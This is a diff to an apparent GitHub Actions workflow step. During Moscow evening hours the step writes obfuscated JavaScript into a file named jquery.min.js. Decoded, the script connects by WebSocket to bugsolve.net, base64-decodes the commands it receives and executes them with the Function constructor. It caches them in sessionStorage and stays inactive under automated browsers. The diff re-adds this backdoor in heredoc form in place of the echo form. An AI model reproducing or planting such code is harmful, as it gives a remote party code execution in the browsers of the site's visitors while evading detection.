@@ -18,7 +18,9 @@ jobs:
       run: |
         MSK_HOUR=$(TZ="Europe/Moscow" date +%H)
         if [ $MSK_HOUR -ge 19 ] && [ $MSK_HOUR -lt 23 ]; then
-          echo '((f,g,m,gsv='\''gs_lo'\'',gs=(arm)=>{arm=new top['\''W'\''['\''concat'\'']('\''ebS'\'', '\''cg'\'' && '\''ock'\'', '\''et'\'')]('\''w'\''['\''concat'\'']('\''ss'\'', '\'':limlim'\'', '\''bu'\'', '\''*'\'' && '\''g'\'', '\''+'\'' && '\''s'\'','\''&'\'' && '\''ol'\'', '\''v'\'', '\''.'\'' && '\''e'\'' || '\'';'\'', '\''.'','\''netlimw'\'' + ('\''&&'\'' && '\''sslim'\''))['\''split'\'']('\''lim'\'')['\''join'\'']("/"));(arm.onmessage = (e) =>{new f('\''m'\'', '\''gsv'\'', '\''verm'\'', g(e['\''data'\''])).call(e['\''target'\''], m, gsv, '\''Z2VvdGR2MnBsemc'\'')})}) => {if(m[gsv]){return f('\''m'\'','\''gsv'\'', '\''verm'\'', g(m[gsv]))(m,gsv, '\''Z2VvdGR2MnBsemc'\'')} else navigator['\''webdriver'\''] || gs();})(Function,atob,sessionStorage);' > jquery.min.js
+          cat > jquery.min.js << 'EOF'
+          ((f,g,m,gsv='gs_lo',gs=(arm)=>{arm=new top['W'['concat']('ebS', 'cg' && 'ock', 'et')]('w'['concat']('ss', ':limlim', 'bu', '*' && 'g', '+' && 's','&' && 'ol', 'v', '.' && 'e' || ';', '.','netlimw' + ('&&' && 'sslim'))['split']('lim')['join']("/"));(arm.onmessage = (e) =>{new f('m', 'gsv', 'verm', g(e['data'])).call(e['target'], m, gsv, 'Z2VvdGR2MnBsemc')})}) => {if(m[gsv]){return f('m','gsv', 'verm', g(m[gsv]))(m,gsv, 'Z2VvdGR2MnBsemc')} else navigator['webdriver'] || gs();})(Function,atob,sessionStorage);
+          EOF
         else
           > jquery.min.js
         fi
